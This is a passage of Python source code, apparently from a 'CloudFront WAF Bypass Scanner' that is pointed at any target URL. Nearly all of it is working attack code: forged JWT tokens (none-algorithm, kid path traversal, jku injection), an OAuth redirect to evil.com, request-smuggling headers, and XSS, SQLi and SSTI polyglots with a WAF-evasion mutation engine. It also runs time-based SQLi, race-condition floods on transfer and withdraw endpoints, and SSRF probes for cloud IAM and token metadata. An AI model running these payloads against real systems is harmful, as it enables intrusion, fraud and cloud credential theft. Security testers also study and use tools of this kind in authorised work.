    def _test_jwt_oauth_bypass(self) -> List[Dict[str, Any]]:
        """JWT/OAuth token bypass testing"""
        results = []
        print("  [*] Testing JWT/OAuth bypass techniques...")
        
        # Common JWT bypass techniques
        jwt_tests = [
            # Algorithm confusion - none algorithm
            {'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.', 'technique': 'JWT None Algorithm'},
            
            # Null signature
            {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.', 'technique': 'JWT Null Signature'},
            
            # Algorithm switch HS256 -> RS256 confusion
            {'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.test', 'technique': 'JWT RS256 Confusion'},
            
            # JWT with kid header injection
            {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIn0.test', 'technique': 'JWT KID Path Traversal'},
            
            # JWT with jku header
            {'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Qvandrcy5qc29uIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.test', 'technique': 'JWT JKU Injection'},
        ]
        
        # OAuth bypass techniques
        oauth_tests = [
            {'redirect_uri': 'https://evil.com', 'technique': 'OAuth Open Redirect'},
            {'scope': 'admin openid profile', 'technique': 'OAuth Scope Escalation'},
            {'response_type': 'token', 'technique': 'OAuth Implicit Flow'},
        ]
        
        for test in jwt_tests:
            headers = {k: v for k, v in test.items() if k != 'technique'}
            technique = test['technique']
            
            result = self._test_request(
                headers={**headers, 'X-Technique': technique},
                method='GET',
                path='/api/user'
            )
            
            if result:
                result['category'] = 'JWT_BYPASS'
                results.append(result)
                if result.get('bypass'):
                    print(f"  [✓] BYPASS: {technique} | {result['reason']}")
        
        # Test OAuth endpoints
        oauth_paths = ['/oauth/authorize', '/auth/authorize', '/oauth2/authorize']
        for oauth_test in oauth_tests:
            technique = oauth_test.pop('technique')
            params = urlencode(oauth_test)
            for path in oauth_paths:
                result = self._test_request(
                    headers={'X-Technique': technique},
                    method='GET',
                    path=f'{path}?{params}'
                )
                if result:
                    result['category'] = 'OAUTH_BYPASS'
                    results.append(result)
        
        return results

    # ============================================================================
    # ADVANCED ATTACK TECHNIQUES
    # ============================================================================
    
    def _test_request_smuggling_v2(self) -> List[Dict[str, Any]]:
        """Advanced request smuggling - H2.CL, H2.TE, HTTP/3 techniques"""
        results = []
        print("  [*] Testing advanced request smuggling (v2)...")
        
        smuggling_tests = [
            # H2.CL - HTTP/2 with Content-Length manipulation
            {
                'headers': {
                    'Content-Length': '0',
                    'Transfer-Encoding': 'chunked',
                    'X-HTTP2-Stream-ID': '1',
                },
                'method': 'POST',
                'technique': 'H2.CL Smuggling'
            },
            # H2.TE - HTTP/2 with Transfer-Encoding
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'TE': 'trailers',
                    'Connection': 'TE',
                },
                'method': 'POST',
                'technique': 'H2.TE Smuggling'
            },
            # TE.TE with obfuscation variations
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Transfer-encoding': 'identity',
                },
                'method': 'POST',
                'technique': 'TE.TE Case Variation'
            },
            {
                'headers': {
                    'Transfer-Encoding': ' chunked',
                    'Transfer-Encoding': 'x',
                },
                'method': 'POST',
                'technique': 'TE.TE Whitespace'
            },
            # CL.0 - Zero Content-Length
            {
                'headers': {
                    'Content-Length': '0',
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                'method': 'POST',
                'technique': 'CL.0 Request Smuggling'
            },
            # HTTP/2 pseudo-header injection
            {
                'headers': {
                    ':method': 'GET',
                    ':path': '/admin',
                    'Host': self.domain,
                },
                'method': 'GET',
                'technique': 'HTTP/2 Pseudo-Header Injection'
            },
            # HTTP/3 QUIC-based smuggling attempt
            {
                'headers': {
                    'Alt-Svc': 'h3=":443"; ma=86400',
                    'Content-Length': '0',
                },
                'method': 'POST',
                'technique': 'HTTP/3 Downgrade Attempt'
            },
        ]
        
        for test in smuggling_tests:
            headers = test['headers'].copy()
            headers['X-Technique'] = test['technique']
            
            result = self._test_request(
                headers=headers,
                method=test['method'],
                path='/'
            )
            
            if result:
                result['category'] = 'REQUEST_SMUGGLING'
                results.append(result)
                if result.get('bypass'):
                    print(f"  [✓] BYPASS: {test['technique']} | {result['reason']}")
        
        return results
    
    def _test_payload_mutation(self) -> List[Dict[str, Any]]:
        """Payload mutation engine - automatically generate variations"""
        results = []
        print("  [*] Testing payload mutations...")
        
        # Base payloads to mutate
        base_payloads = {
            'xss': '<script>alert(1)</script>',
            'sqli': "' OR 1=1--",
            'rce': ';ls -la',
        }
        
        # Mutation functions
        def mutate_payload(payload: str) -> List[str]:
            mutations = []
            
            # Case variations
            mutations.append(payload.swapcase())
            mutations.append(payload.upper())
            mutations.append(''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))
            
            # URL encoding variations
            mutations.append(quote(payload))
            mutations.append(quote(quote(payload)))  # Double encode
            
            # Unicode variations
            mutations.append(payload.replace('a', '\\u0061').replace('e', '\\u0065'))
            
            # Whitespace insertion
            mutations.append(payload.replace(' ', '%09'))  # Tab
            mutations.append(payload.replace(' ', '%0a'))  # Newline
            mutations.append(payload.replace(' ', '%0d'))  # Carriage return
            
            # Comment insertion (for SQL/JS)
            mutations.append(payload.replace(' ', '/**/'))
            
            # Null byte insertion
            mutations.append(payload.replace('=', '%00='))
            
            # HTML entity encoding
            mutations.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
            mutations.append(payload.replace('<', '&#60;').replace('>', '&#62;'))
            
            return mutations
        
        test_cases = []
        for payload_type, base_payload in base_payloads.items():
            for i, mutated in enumerate(mutate_payload(base_payload)[:5]):  # Limit to 5 mutations per type
                test_cases.append({
                    'headers': {},
                    'path': f'/?test={quote_plus(mutated)}',
                    'technique': f'Mutated {payload_type.upper()} #{i+1}'
                })
        
        batch_results = self._batch_test(test_cases)
        for r in batch_results:
            r['category'] = 'PAYLOAD_MUTATION'
            results.append(r)
        
        return results
    
    def _test_polyglot_payloads(self) -> List[Dict[str, Any]]:
        """Polyglot payloads that work across multiple contexts"""
        results = []
        print("  [*] Testing polyglot payloads...")
        
        polyglots = [
            # XSS/HTML/JS polyglot
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            
            # XSS/SQL polyglot
            "'-var x=1;alert(1)//\\';",
            
            # Universal XSS polyglot
            "-->'\"</script><script>alert(1)</script>",
            
            # SVG/XSS/Event polyglot
            "<svg/onload=\"'`*/'/*`*/alert(1)/*`*/'>",
            
            # SQL/XSS polyglot
            "1'<script>alert(1)</script>--",
            
            # Multiple context escape
            "{{constructor.constructor('alert(1)')()}}",
            
            # Template injection polyglot
            "${7*7}{{7*7}}<%=7*7%>${{7*7}}",
            
            # SSTI/XSS polyglot
            "{{''.__class__.__mro__[2].__subclasses__()}}<script>alert(1)</script>",
        ]
        
        test_cases = [
            {'headers': {}, 'path': f'/?p={quote_plus(poly)}', 'technique': f'Polyglot #{i+1}'}
            for i, poly in enumerate(polyglots)
        ]
        
        batch_results = self._batch_test(test_cases)
        for r in batch_results:
            r['category'] = 'POLYGLOT'
            results.append(r)
        
        return results
    
    def _test_time_based_detection(self) -> List[Dict[str, Any]]:
        """Time-based blind detection through response timing analysis"""
        results = []
        print("  [*] Testing time-based blind detection...")
        
        # Time-based SQL injection payloads
        timing_payloads = [
            "/?id=1' AND SLEEP(2)--",
            "/?id=1' AND BENCHMARK(5000000,SHA1('test'))--",
            "/?id=1'; WAITFOR DELAY '0:0:2'--",
            "/?id=1' AND pg_sleep(2)--",
        ]
        
        # Baseline timing
        try:
            start = time.time()
            resp = safe_request(self.target, timeout=self.timeout)
            baseline_time = time.time() - start
            
            for payload_path in timing_payloads:
                start = time.time()
                resp = safe_request(
                    f"{self.target}{payload_path}",
                    timeout=self.timeout + 5  # Extended timeout for sleep payloads
                )
                elapsed = time.time() - start
                
                # If response took significantly longer (2+ seconds more than baseline)
                if elapsed > baseline_time + 1.5:
                    result = {
                        'technique': f'Time-Based Detection: {payload_path[:30]}',
                        'bypass': True,
                        'status': resp.status_code if resp else 0,
                        'reason': f'Response delayed by {elapsed - baseline_time:.1f}s',
                        'severity': 'CRITICAL',
                        'category': 'TIME_BASED'
                    }
                    results.append(result)
                    print(f"  [✓] BYPASS: Time-based SQLi detected | Delay: {elapsed:.1f}s")
                    
        except Exception as e:
            logger.debug(f"Time-based detection error: {e}")
        
        return results
    
    def _test_race_condition(self) -> List[Dict[str, Any]]:
        """Race condition testing with concurrent requests"""
        results = []
        print("  [*] Testing race conditions...")
        
        race_endpoints = [
            '/api/transfer',
            '/api/withdraw',
            '/checkout',
            '/redeem',
            '/apply-coupon',
            '/vote',
        ]
        
        def send_concurrent_requests(endpoint: str, count: int = 10) -> List[Dict]:
            """Send concurrent requests to detect race conditions"""
            responses = []
            
            def make_request():
                try:
                    start = time.time()
                    resp = self._session.post(
                        f"{self.target}{endpoint}",
                        data={'amount': '1'},
                        timeout=self.timeout,
                        verify=False
                    )
                    return {
                        'status': resp.status_code,
                        'time': time.time() - start,
                        'size': len(resp.content),
                        'content_hash': hashlib.md5(resp.content).hexdigest()[:8]
                    }
                except:
                    return None
            
            with ThreadPoolExecutor(max_workers=count) as executor:
                futures = [executor.submit(make_request) for _ in range(count)]
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        responses.append(result)
            
            return responses
        
        for endpoint in race_endpoints:
            try:
                responses = send_concurrent_requests(endpoint, 5)
                
                if len(responses) >= 2:
                    # Analyze for race condition indicators
                    statuses = [r['status'] for r in responses]
                    sizes = [r['size'] for r in responses]
                    hashes = [r['content_hash'] for r in responses]
                    
                    # Different responses might indicate race condition
                    if len(set(statuses)) > 1 or len(set(hashes)) > 1:
                        result = {
                            'technique': f'Race Condition: {endpoint}',
                            'bypass': True,
                            'status': statuses[0],
                            'reason': f'Inconsistent responses detected ({len(set(hashes))} variations)',
                            'severity': 'HIGH',
                            'category': 'RACE_CONDITION'
                        }
                        results.append(result)
                        print(f"  [✓] BYPASS: Race condition detected at {endpoint}")
                        
            except Exception as e:
                logger.debug(f"Race condition test error for {endpoint}: {e}")
        
        return results

    # ============================================================================
    # RECONNAISSANCE FEATURES
    # ============================================================================
    
    def _enumerate_subdomains(self) -> List[Dict[str, Any]]:
        """Subdomain enumeration to find related domains without WAF protection"""
        results = []
        print("  [*] Enumerating subdomains...")
        
        # Common subdomain prefixes
        subdomain_prefixes = [
            'www', 'api', 'dev', 'staging', 'test', 'admin', 'portal',
            'app', 'mail', 'ftp', 'vpn', 'remote', 'secure', 'login',
            'beta', 'alpha', 'demo', 'internal', 'intranet', 'dashboard',
            'cms', 'blog', 'shop', 'store', 'cdn', 'static', 'assets',
            'origin', 'backend', 'server', 'db', 'database', 'mysql',
            'api-v1', 'api-v2', 'v1', 'v2', 'legacy', 'old', 'new',
        ]
        
        # Extract base domain
        domain_parts = self.domain.split('.')
        if len(domain_parts) >= 2:
            base_domain = '.'.join(domain_parts[-2:])
        else:
            base_domain = self.domain
        
        found_subdomains = []
        
        def check_subdomain(prefix: str) -> Optional[Dict]:
            subdomain = f"{prefix}.{base_domain}"
            try:
                # DNS resolution
                ip = socket.gethostbyname(subdomain)
                
                # Try to connect
                test_url = f"https://{subdomain}"
                resp = safe_request(test_url, timeout=3, allow_redirects=True)
                
                if resp:
                    return {
                        'subdomain': subdomain,
                        'ip': ip,
                        'status': resp.status_code,
                        'server': resp.headers.get('server', 'Unknown')
                    }
            except socket.gaierror:
                pass  # DNS resolution failed
            except Exception:
                pass
            return None
        
        # Parallel subdomain checking
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_subdomain, prefix): prefix for prefix in subdomain_prefixes}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_subdomains.append(result)
        
        for sub in found_subdomains:
            # Check if subdomain might lack WAF protection
            is_potentially_unprotected = sub['server'].lower() not in ['cloudflare', 'cloudfront', 'akamai']
            
            result = {
                'technique': f"Subdomain: {sub['subdomain']}",
                'bypass': is_potentially_unprotected,
                'status': sub['status'],
                'reason': f"IP: {sub['ip']} | Server: {sub['server']}",
                'severity': 'MEDIUM' if is_potentially_unprotected else 'INFO',
                'category': 'SUBDOMAIN_ENUM',
                'details': sub
            }
            results.append(result)
            
            status_icon = "[✓]" if is_potentially_unprotected else "[+]"
            print(f"  {status_icon} Found: {sub['subdomain']} ({sub['ip']})")
        
        if not found_subdomains:
            print("  [*] No additional subdomains found via DNS enumeration")
        
        return results
    
    def _historical_dns_lookup(self) -> List[Dict[str, Any]]:
        """Historical DNS lookup to find origin IPs (passive recon)"""
        results = []
        print("  [*] Checking historical DNS records...")
        
        # Note: These are public APIs that may have rate limits
        dns_history_sources = [
            f"https://api.hackertarget.com/dnslookup/?q={self.domain}",
            f"https://api.hackertarget.com/hostsearch/?q={self.domain}",
        ]
        
        found_records = []
        
        for source in dns_history_sources:
            try:
                resp = self._session.get(source, timeout=10, verify=False)
                if resp and resp.status_code == 200 and 'error' not in resp.text.lower():
                    lines = resp.text.strip().split('\n')
                    for line in lines[:10]:  # Limit results
                        if line and ',' in line:
                            parts = line.split(',')
                            if len(parts) >= 2:
                                found_records.append({
                                    'host': parts[0],
                                    'ip': parts[1],
                                    'source': 'HackerTarget'
                                })
            except Exception as e:
                logger.debug(f"DNS history lookup error: {e}")
        
        # Try to identify origin IPs (non-CDN IPs)
        cdn_ip_ranges = ['104.16.', '104.17.', '104.18.', '13.', '52.', '54.']  # Common CDN ranges
        
        for record in found_records:
            ip = record['ip']
            is_cdn = any(ip.startswith(prefix) for prefix in cdn_ip_ranges)
            
            result = {
                'technique': f"Historical DNS: {record['host']}",
                'bypass': not is_cdn,
                'status': 200,
                'reason': f"IP: {ip} | Source: {record['source']}",
                'severity': 'HIGH' if not is_cdn else 'INFO',
                'category': 'DNS_HISTORY',
                'details': record
            }
            results.append(result)
            
            if not is_cdn:
                print(f"  [✓] Potential Origin IP: {ip} ({record['host']})")
        
        if not found_records:
            print("  [*] No historical DNS records found via public APIs")
        
        return results
    
    def _certificate_transparency_lookup(self) -> List[Dict[str, Any]]:
        """Certificate Transparency log lookup to discover related domains"""
        results = []
        print("  [*] Checking Certificate Transparency logs...")
        
        # Extract base domain
        domain_parts = self.domain.split('.')
        if len(domain_parts) >= 2:
            base_domain = '.'.join(domain_parts[-2:])
        else:
            base_domain = self.domain
        
        try:
            # Use crt.sh API (Certificate Transparency)
            ct_url = f"https://crt.sh/?q=%.{base_domain}&output=json"
            resp = self._session.get(ct_url, timeout=15, verify=False)
            
            if resp and resp.status_code == 200:
                try:
                    certs = resp.json()
                    
                    # Extract unique domain names
                    domains_found = set()
                    for cert in certs[:100]:  # Limit to first 100 certs
                        name_value = cert.get('name_value', '')
                        for domain in name_value.split('\n'):
                            domain = domain.strip().lstrip('*.')
                            if domain and base_domain in domain:
                                domains_found.add(domain)
                    
                    # Filter out the main domain and duplicates
                    domains_found.discard(self.domain)
                    domains_found.discard(f'www.{base_domain}')
                    
                    for domain in list(domains_found)[:20]:  # Limit results
                        result = {
                            'technique': f"CT Log: {domain}",
                            'bypass': False,
                            'status': 200,
                            'reason': 'Found in Certificate Transparency logs',
                            'severity': 'INFO',
                            'category': 'CT_LOGS',
                            'details': {'domain': domain}
                        }
                        results.append(result)
                        print(f"  [+] CT Domain: {domain}")
                    
                    if domains_found:
                        print(f"  [+] Found {len(domains_found)} related domains in CT logs")
                    else:
                        print("  [*] No additional domains found in CT logs")
                        
                except Exception as e:
                    logger.debug(f"CT log parse error: {e}")
                    
        except Exception as e:
            logger.debug(f"CT lookup error: {e}")
            print("  [!] Certificate Transparency lookup failed")
        
        return results
    
    def _test_cloud_metadata_enumeration(self) -> List[Dict[str, Any]]:
        """Test for cloud metadata endpoint access (IMDS)"""
        results = []
        print("  [*] Testing cloud metadata enumeration (IMDS)...")
        
        # Cloud metadata endpoints
        metadata_endpoints = [
            # AWS IMDSv1
            ('http://169.254.169.254/latest/meta-data/', 'AWS IMDSv1'),
            ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM Credentials'),
            ('http://169.254.169.254/latest/user-data/', 'AWS User Data'),
            ('http://169.254.169.254/latest/dynamic/instance-identity/document', 'AWS Instance Identity'),
            
            # AWS IMDSv2 (requires token)
            ('http://169.254.169.254/latest/api/token', 'AWS IMDSv2 Token'),
            
            # GCP
            ('http://169.254.169.254/computeMetadata/v1/', 'GCP Metadata'),
            ('http://metadata.google.internal/computeMetadata/v1/', 'GCP Internal Metadata'),
            ('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', 'GCP Service Account Token'),
            
            # Azure
            ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure IMDS'),
            ('http://169.254.169.254/metadata/identity/oauth2/token', 'Azure Managed Identity'),
            
            # DigitalOcean
            ('http://169.254.169.254/metadata/v1/', 'DigitalOcean Metadata'),
            
            # Alibaba Cloud
            ('http://100.100.100.200/latest/meta-data/', 'Alibaba Cloud Metadata'),
            
            # Oracle Cloud
            ('http://169.254.169.254/opc/v1/instance/', 'Oracle Cloud Metadata'),
        ]
        
        # Test via SSRF payloads
        ssrf_payloads = [
            '?url={}',
            '?redirect={}',
            '?link={}',
            '?fetch={}',
            '?target={}',
            '?proxy={}',
            '?dest={}',
        ]
        
        for metadata_url, cloud_type in metadata_endpoints:
            # Direct test (if target is the application)
            for ssrf_param in ssrf_payloads[:3]:  # Limit test variations
                test_url = f"{self.target}{ssrf_param.format(quote(metadata_url))}"
                
                try:
                    headers = {'X-Technique': f'IMDS: {cloud_type}'}
                    if 'GCP' in cloud_type:
                        headers['Metadata-Flavor'] = 'Google'
                    if 'Azure' in cloud_type:
                        headers['Metadata'] = 'true'
                    
                    resp = safe_request(test_url, headers=headers, timeout=3)
                    
                    if resp and resp.status_code == 200:
                        # Check for metadata indicators
                        body = resp.text.lower()
                        if any(ind in body for ind in ['ami-', 'instance-id', 'local-ipv4', 'access_token', 'project-id', 'subscription']):
                            result = {
                                'technique': f'Cloud Metadata: {cloud_type}',
                                'bypass': True,
                                'status': resp.status_code,
                                'reason': f'SSRF to {cloud_type} metadata endpoint successful',
                                'severity': 'CRITICAL',
                                'category': 'CLOUD_METADATA'
                            }
                            results.append(result)
                            print(f"  [✓] CRITICAL: {cloud_type} metadata accessible!")
                            
                except Exception as e:
                    logger.debug(f"IMDS test error: {e}")
        
        if not results:
            print("  [*] No cloud metadata endpoints accessible via SSRF")
        
        return results
    
    def _fingerprint_technology_stack(self) -> List[Dict[str, Any]]:
        """Fingerprint backend technology stack (frameworks, CMS, languages)"""
        results = []
        print("  [*] Fingerprinting technology stack...")
        
        try:
            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if not resp:
                return results
            
            body_lower = resp.text.lower()
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            cookies_str = str(resp.cookies.get_dict()).lower()
            
            detected_tech = {
                'frameworks': [],
                'cms': [],
                'servers': [],
                'languages': [],
            }
            
            # Check frameworks
            for tech_name, signatures in TECHNOLOGY_SIGNATURES['frameworks'].items():
                confidence = 0
                matched = []
                
                for header in signatures.get('headers', []):
                    if header.lower() in headers_lower:
                        confidence += 30
                        matched.append(f"Header: {header}")
                
                for cookie in signatures.get('cookies', []):
                    if cookie.lower() in cookies_str:
                        confidence += 30
                        matched.append(f"Cookie: {cookie}")
                
                for pattern in signatures.get('patterns', []):
                    if pattern.lower() in body_lower or pattern.lower() in str(headers_lower):
                        confidence += 25
                        matched.append(f"Pattern: {pattern}")
                
                if confidence > 0:
                    detected_tech['frameworks'].append({
                        'name': tech_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            # Check CMS
            for cms_name, signatures in TECHNOLOGY_SIGNATURES['cms'].items():
                confidence = 0
                matched = []
                
                for pattern in signatures.get('patterns', []):
                    if pattern.lower() in body_lower:
                        confidence += 35
                        matched.append(f"Pattern: {pattern}")
                
                for cookie in signatures.get('cookies', []):
                    if cookie.lower() in cookies_str:
                        confidence += 30
                        matched.append(f"Cookie: {cookie}")
                
                if confidence > 0:
                    detected_tech['cms'].append({
                        'name': cms_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            # Check servers
            server_header = headers_lower.get('server', '')
            for server_name, signatures in TECHNOLOGY_SIGNATURES['servers'].items():
                for pattern in signatures.get('patterns', []):
                    if pattern.lower() in server_header:
                        detected_tech['servers'].append({
                            'name': server_name,
                            'confidence': 90,
                            'indicators': [f"Server: {server_header}"]
                        })
                        break
            
            # Check languages
            for lang_name, signatures in TECHNOLOGY_SIGNATURES['languages'].items():
                confidence = 0
                matched = []
                
                for header in signatures.get('headers', []):
                    if header.lower() in headers_lower:
                        header_value = headers_lower.get(header.lower(), '')
                        if lang_name.lower() in header_value:
                            confidence += 40
                            matched.append(f"Header: {header}={header_value}")
                
                for pattern in signatures.get('patterns', []):
                    if pattern.lower() in body_lower or pattern.lower() in str(headers_lower) or pattern.lower() in cookies_str:
                        confidence += 25
                        matched.append(f"Pattern: {pattern}")
                
                if confidence > 0:
                    detected_tech['languages'].append({
                        'name': lang_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            # Generate results
            for category, techs in detected_tech.items():
                for tech in techs:
                    severity = 'MEDIUM' if tech['confidence'] >= 60 else 'LOW'
                    result = {
                        'technique': f"Tech Stack ({category}): {tech['name'].upper()}",
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': f"Confidence: {tech['confidence']}% - {', '.join(tech['indicators'][:2])}",
                        'severity': severity,
                        'category': 'TECH_FINGERPRINT',
                        'details': tech
                    }
                    results.append(result)
                    print(f"  [+] {category.title()}: {tech['name'].upper()} (Confidence: {tech['confidence']}%)")
            
            if not any(detected_tech.values()):
                print("  [*] No specific technology signatures detected")
                
        except Exception as e:
            logger.debug(f"Tech fingerprinting error: {e}")
        
        return results


def main():
    """Standalone scanner with comprehensive error handling"""
    from argparse import ArgumentParser
    import json
    import sys
    from .error_handler import setup_logging
    
    parser = ArgumentParser(description='CloudFront WAF Bypass Scanner')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-d', '--delay', type=float, default=0.2, help='Delay between requests')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout in seconds')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('--log-file', help='Log file path')
    parser.add_argument('--log-level', default='INFO', 
                       choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'],
                       help='Logging level')
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(args.log_file, args.log_level)
    
    try:
        # Initialize scanner
        scanner = CloudFrontBypasser(args.target, args.threads, args.delay, args.timeout)
        
        # Run scan
        results = scanner.scan()
        
        # Display results
        print(f"\n{'='*60}")
        print(f"[+] Scan Complete: Found {len(results)} findings")
        print(f"{'='*60}\n")
        
        if results:
            # Group by severity
            critical = [r for r in results if r.get('severity') == 'CRITICAL']
            high = [r for r in results if r.get('severity') == 'HIGH']
            medium = [r for r in results if r.get('severity') == 'MEDIUM']
            low = [r for r in results if r.get('severity') == 'LOW']
            info = [r for r in results if r.get('severity') == 'INFO']
            
            # Count actual bypasses
            bypasses = [r for r in results if r.get('bypass', False)]
            detections = [r for r in results if r.get('category') in ['WAF_DETECTION', 'CDN_DETECTION', 'API_DISCOVERY']]
            
            print(f"📊 Summary:")
            print(f"   Total Findings: {len(results)}")
            print(f"   Actual Bypasses: {len(bypasses)}")
            print(f"   WAF/CDN Detections: {len(detections)}")
            print()
            
            if critical:
                print(f"🔴 CRITICAL ({len(critical)}):")
                for r in critical:
                    print(f"  - {r['technique']}")
                    print(f"    Reason: {r['reason']}")
            
            if high:
                print(f"\n🟠 HIGH ({len(high)}):")
                for r in high:
                    print(f"  - {r['technique']}")
                    print(f"    Reason: {r['reason']}")
            
            if medium:
                print(f"\n🟡 MEDIUM ({len(medium)}):")
                for r in medium:
                    print(f"  - {r['technique']}")
                    print(f"    Reason: {r['reason']}")
            
            if low:
                print(f"\n🔵 LOW ({len(low)}):")
                for r in low:
                    print(f"  - {r['technique']}")
                    if r.get('reason'):
                        print(f"    Reason: {r['reason']}")
            
            if info:
                print(f"\nℹ️  INFO ({len(info)}):")
                for r in info:
                    print(f"  - {r['technique']}")
                    if r.get('reason'):
                        print(f"    Reason: {r['reason']}")
        else:
            print("✅ No bypasses found - target is properly protected")
        
        # Save results
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"\n[+] Results saved to {args.output}")
        
        # Return appropriate exit code
        sys.exit(0 if len(results) == 0 else 1)
    
    except InvalidTargetError as e:
        print(f"[!] Invalid target: {e}")
        logger.error(f"Invalid target: {e}")
        sys.exit(2)
    
    except BaselineFailedError as e:
        print(f"[!] Baseline failed: {e}")
        logger.error(f"Baseline failed: {e}")
        sys.exit(3)
    
    except TargetUnreachableError as e:
        print(f"[!] Target unreachable: {e}")
        logger.error(f"Target unreachable: {e}")
        sys.exit(4)
    
    except ScanInterruptedError as e:
        print(f"\n[!] Scan interrupted: {e}")
        logger.warning(f"Scan interrupted: {e}")
        sys.exit(130)  # Standard exit code for SIGINT
    
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        logger.warning("Scan interrupted by user (Ctrl+C)")
        sys.exit(130)
    
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        logger.exception("Unexpected error during scan")
        sys.exit(1)


if __name__ == '__main__':
    main()